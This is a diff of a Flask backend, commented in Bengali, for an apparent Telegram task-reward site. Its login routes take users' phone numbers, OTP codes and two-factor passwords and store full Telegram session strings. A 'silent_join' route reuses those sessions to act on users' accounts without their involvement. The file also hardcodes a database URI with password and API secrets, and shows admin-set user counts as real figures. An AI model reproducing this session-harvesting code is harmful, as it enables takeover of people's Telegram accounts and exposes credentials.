@@ -6,9 +6,10 @@ from flask_cors import CORS
 from pymongo import MongoClient
 from telethon.sync import TelegramClient
 from telethon.sessions import StringSession
-from telethon.tl.functions.channels import JoinChannelRequest, GetParticipantRequest # নতুন যোগ করা
+from telethon.tl.functions.channels import JoinChannelRequest, GetParticipantRequest
 import firebase_admin
 from firebase_admin import credentials, db
+
 # ---------------------------------------------------------
 # ১. কনফিগারেশন ও ডাটাবেস সেটআপ
 # ---------------------------------------------------------
@@ -16,19 +17,16 @@ app = Flask(__name__)
 app.secret_key = os.environ.get("SECRET_KEY", "aaf_strong_secure_786")
 CORS(app)
 
-# API & DB Credentials
 API_ID = 36466824
 API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
 MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"
 
-# Firebase Setup (Update with your databaseURL)
 if not firebase_admin._apps:
-    cred = credentials.Certificate("firebase-adminsdk.json") # আপনার ফায়ারবেস জেসন ফাইলটি আপলোড করুন
+    cred = credentials.Certificate("firebase-adminsdk.json")
     firebase_admin.initialize_app(cred, {
         'databaseURL': 'https://teleearnbd-781d6-default-rtdb.firebaseio.com'
     })
 
-# MongoDB কানেকশন
 client_db = MongoClient(MONGO_URI)
 mdb = client_db['aaf_tele_earn_db']
 users_col = mdb['users']
@@ -36,25 +34,19 @@ tasks_col = mdb['tasks']
 settings_col = mdb['settings']
 
 # ---------------------------------------------------------
-# ২. হেল্পার ফাংশন ও ডেকোরেটর
+# ২. হেল্পার ফাংশন
 # ---------------------------------------------------------
 def login_required(f):
     @wraps(f)
     def decorated_function(*args, **kwargs):
         if 'uid' not in session:
-            return redirect(url_for('index'))
+            return redirect(url_for('render_login'))
         return f(*args, **kwargs)
     return decorated_function
 
 def get_admin_settings():
-    """ফায়ারবেস থেকে লাইভ সেটিংস নিয়ে আসে"""
     return db.reference('admin_settings').get() or {}
 
-
-# ---------------------------------------------------------
-# ৩. ইউজার ডাটা ও ড্যাশবোর্ড API
-# ---------------------------------------------------------
-# --- নতুন ফাংশন: মেম্বারশিপ চেক ---
 def check_membership(session_str, channel_id):
     if not session_str or not channel_id: return False
     try:
@@ -67,7 +59,38 @@ def check_membership(session_str, channel_id):
     except:
         return False
 
-# --- নতুন রুট: সাইলেন্ট অটো-জয়েন (ড্যাশবোর্ড বাটনের জন্য) ---
+# ---------------------------------------------------------
+# ৩. API রুটস
+# ---------------------------------------------------------
+
+@app.route('/api/user/data/<int:user_id>')
+def get_user_data_by_id(user_id):
+    if 'uid' not in session or session.get('uid') != user_id:
+        return jsonify({"status": "error", "message": "Unauthorized"}), 401
+    
+    user = users_col.find_one({"telegram_id": user_id})
+    admin_data = get_admin_settings()
+
+    if not user:
+        return jsonify({"status": "error", "message": "User not found"}), 404
+
+    return jsonify({
+        "status": "success",
+        "user": {
+            "username": user.get("name", "User"),
+            "telegram_id": user.get("telegram_id"),
+            "cash": f"{user.get('main_balance', 0.0):.2f}",
+            "aaf": f"{user.get('aaf_balance', 0):.0f}",
+            "is_joined": user.get('is_joined', False)
+        },
+        "admin": {
+            "channel_url": admin_data.get('channel_link', '#'),
+            "server_income": admin_data.get('server_income', 0),
+            "server_trading": admin_data.get('server_trading', 0),
+            "total_users": admin_data.get('extra_users', 0)
+        }
+    })
+
 @app.route('/api/silent_join', methods=['POST'])
 @login_required
 def silent_join():
@@ -86,7 +109,6 @@ def silent_join():
             client = TelegramClient(StringSession(user['session_str']), API_ID, API_HASH, loop=loop)
             with client:
                 client.loop.run_until_complete(client(JoinChannelRequest(target_channel)))
-            # ডাটাবেসে আপডেট
             users_col.update_one({"telegram_id": uid}, {"$set": {"is_joined": True}})
         except Exception as e:
             print(f"Join Error: {e}")
@@ -94,42 +116,6 @@ def silent_join():
     threading.Thread(target=background_join).start()
     return jsonify({"success": True})
 
-# --- এটি আপনার পুরনো ফাংশনটির বদলে বসান ---
-@app.route('/api/user/data/<int:user_id>')
-def get_user_data_by_id(user_id):
-    # সেশন চেক (নিরাপত্তার জন্য)
-    if 'uid' not in session or session.get('uid') != user_id:
-        return jsonify({"status": "error", "message": "Unauthorized"}), 401
-
-    user = users_col.find_one({"telegram_id": user_id})
-    admin_data = get_admin_settings()
-
-    if not user:
-        return jsonify({"status": "error", "message": "User not found"}), 404
-
-    # আমরা এখন সরাসরি ডাটাবেস থেকে স্ট্যাটাস নিচ্ছি (টেলিগ্রাম থেকে নয়)
-    is_joined = user.get('is_joined', False)
-
-    return jsonify({
-        "status": "success",
-        "user": {
-            "username": user.get("name", "User"),
-            "telegram_id": user.get("telegram_id"),
-            "cash": f"{user.get('main_balance', 0.0):.2f}",
-            "aaf": f"{user.get('aaf_balance', 0):.0f}",
-            "is_joined": is_joined # সাইলেন্ট জয়েন সফল হলে এটি ডাটাবেস থেকে True আসবে
-        },
-        "admin": {
-            "channel_url": admin_data.get('channel_link', '#'),
-            "server_income": admin_data.get('server_income', 0),
-            "server_trading": admin_data.get('server_trading', 0),
-            "total_users": admin_data.get('extra_users', 0)
-        }
-    })
-# ---------------------------------------------------------
-# ৪. টাস্ক সিস্টেম (Task Engine)
-# ---------------------------------------------------------
-# এই অংশটুকু আপনার app.py এর টাস্ক ক্লেইম সেকশনে বসান
 @app.route('/api/user/tasks/claim', methods=['POST'])
 @login_required
 def claim_task():
@@ -137,27 +123,20 @@ def claim_task():
     task_id = request.json.get('task_id')
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    # ফায়ারবেস থেকে আইপি সিকিউরিটি সেটিংস চেক
-    admin_data = db.reference('admin_settings').get() or {}
-    ip_security_on = admin_data.get('ip_security', True) 
-
+    admin_data = get_admin_settings()
     task = tasks_col.find_one({"id": task_id})
     user = users_col.find_one({"telegram_id": uid})
 
     if not task or not user:
         return jsonify({"success": False, "message": "Invalid Task/User"})
 
-    # চেক ১: একই আইডি দিয়ে আগে করেছে কি না
+    # মেম্বারশিপ চেক (লিভ নিলে টাকা পাবে না)
+    if not user.get('is_joined', False):
+        return jsonify({"success": False, "message": "আগে চ্যানেলে জয়েন করুন!"})
+
     if task_id in user.get("completed_tasks", []):
-        return jsonify({"success": False, "message": "আপনি এই আইডি দিয়ে টাস্কটি আগেই করেছেন!"})
+        return jsonify({"success": False, "message": "ইতিমধ্যেই করেছেন!"})
 
-    # চেক ২: একই আইপি দিয়ে আগে হয়েছে কি না (যদি এডমিন চালু রাখে)
-    if ip_security_on:
-        ip_check = mdb['ip_logs'].find_one({"task_id": task_id, "ip": user_ip})
-        if ip_check:
-            return jsonify({"success": False, "message": "একই ইন্টারনেট (IP) দিয়ে একাধিক আইডি এলাউড নয়!"})
-
-    # ৩. সব ঠিক থাকলে ব্যালেন্স আপডেট
     reward = float(task['reward'])
     balance_field = "aaf_balance" if task['currency'] == 'aaf' else "main_balance"
 
@@ -165,11 +144,65 @@ def claim_task():
         {"telegram_id": uid},
         {"$inc": {balance_field: reward, "tasks_done": 1}, "$push": {"completed_tasks": task_id}}
     )
+    return jsonify({"success": True, "message": f"{reward} ক্লেইম হয়েছে!"})
 
-    # আইপি লগ সেভ
-    mdb['ip_logs'].insert_one({"task_id": task_id, "ip": user_ip, "user_id": uid, "time": datetime.now()})
+# ---------------------------------------------------------
+# ৪. লগইন ও OTP সিস্টেম
+# ---------------------------------------------------------
+temp_clients = {}
 
-    return jsonify({"success": True, "message": f"সাফল্যের সাথে {reward} ক্লেইম হয়েছে!"})
+@app.route('/api/send_otp', methods=['POST'])
+def send_otp():
+    phone = request.json.get('phone')
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
+    try:
+        client.connect()
+        result = client.send_code_request(phone)
+        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
+        return jsonify({"success": True})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
+
+@app.route('/api/verify_login', methods=['POST'])
+def verify_login():
+    data = request.json
+    phone, code, pwd = data.get('phone'), data.get('code'), data.get('password')
+    temp = temp_clients.get(phone)
+    if not temp: return jsonify({"success": False, "message": "Session Expired"})
+    
+    client = temp['client']
+    loop = temp['loop']
+    
+    async def process_signin():
+        try:
+            user = await client.sign_in(phone, code, phone_code_hash=temp['hash'], password=pwd)
+            session_str = client.session.save()
+            users_col.update_one(
+                {"telegram_id": user.id},
+                {"$set": {
+                    "name": getattr(user, 'first_name', 'User'),
+                    "phone": phone,
+                    "session_str": session_str,
+                    "is_joined": False, # নতুন লগইনে জয়েন রিসেট
+                    "last_login": datetime.now()
+                }},
+                upsert=True
+            )
+            return {"success": True, "uid": user.id}
+        except Exception as e:
+            return {"success": False, "message": str(e)}
+
+    try:
+        future = asyncio.run_coroutine_threadsafe(process_signin(), loop)
+        result = future.result(timeout=60)
+        if result["success"]: session["uid"] = result["uid"]
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
+
+
 
 # ---------------------------------------------------------
 # ৫. ট্রেডিং ও মার্কেট কন্ট্রোল
@@ -215,72 +248,6 @@ def get_all_users():
     except Exception as e:
         return jsonify({"success": False, "message": str(e)})
 
-# ---------------------------------------------------------
-# ৭. টেলিগ্রাম লগইন ও OTP
-# ---------------------------------------------------------
-temp_clients = {}
-
-@app.route('/api/send_otp', methods=['POST'])
-def send_otp():
-    phone = request.json.get('phone')
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    client = TelegramClient(StringSession(), API_ID, API_HASH, loop=loop)
-    client.connect()
-    
-    try:
-        result = client.send_code_request(phone)
-        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash, "loop": loop}
-        return jsonify({"success": True})
-    except Exception as e:
-        return jsonify({"success": False, "message": str(e)})
-
-@app.route('/api/verify_login', methods=['POST'])
-# ফ্লাস্কে সরাসরি async রুট কাজ না করলে নিচের লজিকটি ফলো করুন
-def verify_login():
-    data = request.json
-    phone, code, pwd = data.get('phone'), data.get('code'), data.get('password')
-    
-    temp = temp_clients.get(phone)
-    if not temp: 
-        return jsonify({"success": False, "message": "Session Expired. Please try again."})
-    
-    client = temp['client']
-    loop = temp['loop']
-    
-    async def process_signin():
-        try:
-            # এখানে অবশ্যই await ব্যবহার করতে হবে
-            user = await client.sign_in(phone, code, phone_code_hash=temp['hash'], password=pwd)
-            session_str = client.session.save() # সেশন জেনারেট
-            
-            # ডাটাবেসে সেভ করার লজিক
-            users_col.update_one(
-                {"telegram_id": user.id},
-                {"$set": {
-                    "name": getattr(user, 'first_name', 'No Name'),
-                    "phone": phone,
-                    "session_str": session_str, 
-                    "$set": {"is_joined": False,}
-                    "last_login": datetime.now()
-                }},
-                upsert=True
-            )
-            return {"success": True, "uid": user.id}
-        except Exception as e:
-            return {"success": False, "message": str(e)}
-
-    # অ্যাসিনক্রোনাস ফাংশনটি লুপের মাধ্যমে রান করা
-    try:
-        future = asyncio.run_coroutine_threadsafe(process_signin(), loop)
-        result = future.result(timeout=60) # ৬০ সেকেন্ড সময় দেওয়া হলো
-        
-        if result["success"]:
-            session["uid"] = result["uid"]
-        
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({"success": False, "message": f"Server Error: {str(e)}"})
 
 # ---------------------------------------------------------
 # ৮. পেজ রাউটিং (Frontend Rendering)
